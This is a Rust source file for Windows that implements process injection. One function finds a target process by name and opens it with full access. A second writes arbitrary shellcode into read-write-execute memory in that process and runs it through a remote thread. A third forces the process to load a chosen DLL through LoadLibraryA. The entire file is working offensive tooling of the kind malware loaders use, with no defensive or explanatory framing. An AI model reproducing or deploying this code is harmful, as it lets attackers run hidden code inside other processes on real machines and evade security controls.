use core::ffi::c_void;
use std::ptr;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    LibraryLoader::{GetModuleHandleA, GetProcAddress},
    Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameW},
    Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS},
};
pub fn inject_shellcode(process_name: String, buf: Vec<u8>) -> Result<HANDLE, &'static str> {
    let h_process: HANDLE;
    let addr: *mut c_void;

    h_process = find_process(process_name)?;

    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
            h_process,
            ptr::null(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as *const c_void;

    if unsafe { WriteProcessMemory(h_process, addr, shellcode, buf.len(), &mut nb_written_bytes) }
        == 0
    {
        println!("Error in WriteProcessMemory");
        return Err("Couldn't write process memory");
    }

    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
            *(&addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    return unsafe {
        Ok(CreateRemoteThread(
            h_process,
            ptr::null(),
            0,
            base_addr,
            ptr::null(),
            0,
            ptr::null_mut(),
        ))
    };
}

pub fn inject_dll(process_name: String, file_path: &str) -> Result<HANDLE, &'static str> {
    let h_process: HANDLE;
    let addr: *mut c_void;

    //    1. Find process
    h_process = find_process(process_name)?;

    //2. Allocate some memory
    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
            h_process,
            ptr::null(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    let mut nb_written_bytes = 0;
    //3. Write DLL path
    if unsafe {
        WriteProcessMemory(
            h_process,
            addr,
            file_path.as_ptr() as *const c_void,
            file_path.len(),
            &mut nb_written_bytes,
        )
    } == 0
    {
        println!("Error in WriteProcessMemory");
        return Err("Couldn't write process memory");
    }
    //    4. Find Kernel32 addr
    let k32: &str = "KERNEL32.DLL\0";
    let kernel32_addr = unsafe { GetModuleHandleA(k32.as_ptr()) };
    if kernel32_addr == 0 {
        return Err("Couldn't find kernel32");
    }
    println!("Found kernel32 address at: {:#x}", kernel32_addr);
    //    5. Find LoadLibraryA addr
    let proc_name: &str = "LoadLibraryA\0";
    let proc_addr = unsafe {
        GetProcAddress(kernel32_addr, proc_name.as_ptr()).expect("Couldn't find LoadLibraryA")
    } as usize;
    if proc_addr == 0 {
        return Err("Invalid LoadLibraryA address");
    }
    println!("Found LoadLibraryA address at: {:#x}", proc_addr);
    //    6. Start thread to load dll
    //
    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
            *(&proc_addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    let remote_thread_handle = unsafe {
        CreateRemoteThread(
            h_process,
            ptr::null(),
            0,
            base_addr,
            addr,
            0,
            ptr::null_mut(),
        )
    };
    if remote_thread_handle == 0 {
        return Err("Couldn't create remote thread");
    } else {
        return Ok(remote_thread_handle);
    }
    //    Ok(h_process)
}

pub fn find_process(process_name: String) -> Result<HANDLE, &'static str> {
    let nb_process: usize;
    let mut process_array = Vec::<u32>::with_capacity(2048);
    let mut cb_needed = 0;

    //    1. create an array of all processes
    if unsafe {
        K32EnumProcesses(
            process_array.as_mut_ptr(),
            (process_array.capacity() * std::mem::size_of::<u32>()) as u32,
            &mut cb_needed,
        )
    } == 0
    {
        return Err("Could not enumerate processes.");
    } else {
        nb_process = (cb_needed as usize) / std::mem::size_of::<u32>();
        unsafe { process_array.set_len(nb_process) };
    }
    println!("Found {} processes.", nb_process);

    //    2. Open all processes and get their ModuleBaseName
    for pid in process_array {
        let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
        if h_process != 0 {
            let mut target_process_name = [0u16; 125];
            unsafe { K32GetModuleBaseNameW(h_process, 0, target_process_name.as_mut_ptr(), 125) };
            //                3. compare the process name
            if String::from_utf16_lossy(&target_process_name).contains(&process_name.as_str()) {
                println!("Found process with id: {}", pid);
                return Ok(h_process);
            } else {
                unsafe { CloseHandle(h_process) };
            }
        }
    }
    return Err("Process not found :-(");
}
